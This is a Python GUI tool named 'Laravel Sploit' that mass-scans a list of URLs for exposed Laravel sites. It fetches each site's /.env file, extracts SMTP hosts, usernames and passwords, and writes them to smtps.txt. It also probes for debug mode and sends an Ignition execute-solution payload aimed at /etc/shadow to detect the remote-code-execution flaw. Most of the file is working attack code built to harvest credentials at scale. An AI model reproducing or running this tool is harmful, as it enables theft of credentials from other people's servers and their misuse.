import tkinter as tk
from tkinter import messagebox, scrolledtext, filedialog
import requests
from bs4 import BeautifulSoup
import os
import ssl
import threading

# Suppress SSL certificate verification warnings
ssl._create_default_https_context = ssl._create_unverified_context

class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class LaravelScannerApp:
    def __init__(self, master):
        self.master = master
        master.title("Laravel Sploit")
        master.configure(bg="black")

        # Target URL Entry
        self.url_label = tk.Label(master, text="Upload File with URLs:", fg="white", bg="black")
        self.url_label.grid(row=0, column=0, sticky="w")
        self.url_entry = tk.Entry(master, width=50)
        self.url_entry.grid(row=0, column=1, columnspan=2, padx=5, pady=5)
        self.browse_button = tk.Button(master, text="Browse", command=self.browse_file)
        self.browse_button.grid(row=0, column=3, padx=5, pady=5)

        # Scan Button
        self.scan_button = tk.Button(master, text="Scan", command=self.start_scan, fg="white", bg="black")
        self.scan_button.grid(row=1, column=2, padx=5, pady=5)

        # Scan Results Text
        self.result_label = tk.Label(master, text="Scan Results:", fg="white", bg="black")
        self.result_label.grid(row=2, column=0, columnspan=3, sticky="w", padx=5, pady=5)
        self.result_text = scrolledtext.ScrolledText(master, width=80, height=15, bg="black", fg="white")
        self.result_text.grid(row=3, column=0, columnspan=3, padx=5, pady=5)
        
        # Footer
        self.footer_label = tk.Label(master, text="Total Scans: 0 | Total Environments Found: 0", fg="white", bg="black")
        self.footer_label.grid(row=4, column=0, columnspan=3, sticky="w", padx=5, pady=5)

        # Configure tags for color
        self.result_text.tag_configure("green", foreground="green")
        self.result_text.tag_configure("red", foreground="red")

    def browse_file(self):
        filename = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        self.url_entry.delete(0, tk.END)
        self.url_entry.insert(tk.END, filename)

    def fingerprint(self, host):
        fingerprint_data = dict()

        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'}
        
        try:
            response = requests.get(host, headers=headers, verify=False, allow_redirects=True)
            fingerprint_data['response_code'] = response.status_code

            if('Location' in response.headers):
                fingerprint_data['redirect_location'] = response.headers["Location"]

            if('server' in response.headers and response.headers['Server']):
                fingerprint_data['server']  =  response.headers['server']

            if('X-Powered-By' in response.headers and 'PHP' in response.headers['X-Powered-By']):
                fingerprint_data['php_version'] =  response.headers['X-Powered-By']

            for cookie in dict(response.cookies):
                if('XSRF-TOKEN' in cookie or '_session' in cookie):
                    fingerprint_data[cookie] = response.cookies[cookie][:20]

            soup = BeautifulSoup(response.text, "html.parser")
            laravel_version = soup.find('div', {'class':'ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0'})
            if laravel_version:
                fingerprint_data['laravel_version'] = laravel_version.text.strip()

            laravel_default = soup.find('div', {'class':'title m-b-md'})
            if laravel_default:
                fingerprint_data['laravel_default'] = True

            env_testing = requests.get(host + "/.env", headers=headers, verify=False)
            if env_testing.status_code == 200 and 'APP_ENV' in env_testing.text:
                fingerprint_data['laravel_env'] = True
                env_content = env_testing.text
                smtp_config = self.parse_smtp_config(env_content)
                if smtp_config:
                    fingerprint_data['smtp_config'] = smtp_config

        except Exception as e:
            print(f"An error occurred during fingerprinting: {str(e)}")

        return fingerprint_data

    def parse_smtp_config(self, env_content):
        smtp_config = {}
        env_lines = env_content.split('\n')
        for line in env_lines:
            if 'MAIL_DRIVER' in line:
                smtp_config['driver'] = line.split('=')[1].strip()
            elif 'MAIL_HOST' in line:
                smtp_config['host'] = line.split('=')[1].strip()
            elif 'MAIL_PORT' in line:
                smtp_config['port'] = line.split('=')[1].strip()
            elif 'MAIL_USERNAME' in line:
                smtp_config['username'] = line.split('=')[1].strip()
            elif 'MAIL_PASSWORD' in line:
                smtp_config['password'] = line.split('=')[1].strip()
            elif 'MAIL_ENCRYPTION' in line:
                smtp_config['encryption'] = line.split('=')[1].strip()
        return smtp_config

    def check_debug(self, host):
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'] 

        for method in methods:
            try:
                response = requests.request(method, host, verify=False)
                if(response.status_code == 405 and 'MethodNotAllowedHttpException' in response.text):
                    return True
            except:
                pass
        return False

    def check_ignition(self, host):
        headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'deflate'}
        data = '{"solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "/etc/shadow"}}'

        try:
            response = requests.post(host + '/_ignition/execute-solution', data, headers=headers, verify=False)
            if 'failed to open stream: Permission denied' in response.text:
                return True
        except Exception as e:
            print(f"An error occurred while checking for Ignition vulnerability: {str(e)}")
        return False

    def update_footer(self, total_scans, total_environments):
        self.footer_label.config(text=f"Total Scans: {total_scans} | Total Environments Found: {total_environments}")

    def save_found_environments(self, found_environments):
        try:
            with open("envis.txt", "w") as file:
                for url in found_environments:
                    file.write(url + "\n")
        except Exception as e:
            print(f"An error occurred while saving found environments: {str(e)}")

    def save_smtps(self, smtps):
        try:
            with open("smtps.txt", "w") as file:
                for smtp in smtps:
                    file.write(f"{smtp['host']}:{smtp['port']}:{smtp['username']}:{smtp['password']}\n")
        except Exception as e:
            print(f"An error occurred while saving SMTP configurations: {str(e)}")

    def process_scan(self):
        urls_file = self.url_entry.get()

        if not urls_file:
            messagebox.showerror("Error", "Please select a file containing URLs.")
            return

        if not os.path.isfile(urls_file):
            messagebox.showerror("Error", "File not found.")
            return

        try:
            with open(urls_file, 'r') as file:
                urls = file.readlines()
        except Exception as e:
            messagebox.showerror("Error", f"Error reading file: {str(e)}")
            return

        self.result_text.delete("1.0", tk.END)
        total_scans = 0
        total_environments = 0
        found_environments = []
        smtps = []

        for url in urls:
            host = url.strip()
            self.result_text.insert(tk.END, f"Scanning {host}...\n")
            self.result_text.see(tk.END)  # Auto-scroll to the end

            fingerprint_data = self.fingerprint(host)
            if fingerprint_data:
                self.result_text.insert(tk.END, f"Results for {host}:\n")
                self.result_text.insert(tk.END, f"Response Code: {fingerprint_data.get('response_code', 'N/A')}\n")
                self.result_text.insert(tk.END, f"Redirect Location: {fingerprint_data.get('redirect_location', 'N/A')}\n")
                self.result_text.insert(tk.END, f"Server: {fingerprint_data.get('server', 'N/A')}\n")
                self.result_text.insert(tk.END, f"PHP Version: {fingerprint_data.get('php_version', 'N/A')}\n")
                self.result_text.insert(tk.END, f"Laravel Version: {fingerprint_data.get('laravel_version', 'N/A')}\n")
                self.result_text.insert(tk.END, f"Laravel Default: {fingerprint_data.get('laravel_default', 'N/A')}\n")
                laravel_env_text = f"Laravel Environment: {'True' if fingerprint_data.get('laravel_env') else 'N/A'}\n"
                self.result_text.insert(tk.END, laravel_env_text, "green" if fingerprint_data.get('laravel_env') else "red")
                
                debug_mode = self.check_debug(host)
                self.result_text.insert(tk.END, f"Debug Mode: {'Enabled' if debug_mode else 'Disabled'}\n")

                ignition_vuln = self.check_ignition(host)
                self.result_text.insert(tk.END, f"Ignition Vulnerability: {'Detected' if ignition_vuln else 'Not detected'}\n")

                smtp_config = fingerprint_data.get('smtp_config')
                if smtp_config:
                    self.result_text.insert(tk.END, "\nSMTP Configuration:\n")
                    self.result_text.insert(tk.END, f"Host: {smtp_config.get('host', 'N/A')}\n")
                    self.result_text.insert(tk.END, f"Port: {smtp_config.get('port', 'N/A')}\n")
                    self.result_text.insert(tk.END, f"Username: {smtp_config.get('username', 'N/A')}\n")
                    self.result_text.insert(tk.END, f"Password: {smtp_config.get('password', 'N/A')}\n")
                    self.result_text.insert(tk.END, f"Encryption: {smtp_config.get('encryption', 'N/A')}\n")

                    # Save SMTP configuration
                    smtps.append(smtp_config)

                self.result_text.insert(tk.END, "\n")
                total_scans += 1
                
                if fingerprint_data.get('laravel_env'):
                    total_environments += 1
                    found_environments.append(host)
                
            else:
                self.result_text.insert(tk.END, f"No fingerprint data available for {host}\n")
                self.result_text.insert(tk.END, "\n")

            self.result_text.see(tk.END)  # Auto-scroll to the end

        self.update_footer(total_scans, total_environments)
        self.save_found_environments(found_environments)
        self.save_smtps(smtps)

    def start_scan(self):
        threading.Thread(target=self.process_scan).start()

def main():
    root = tk.Tk()
    root.configure(bg="black")
    app = LaravelScannerApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()
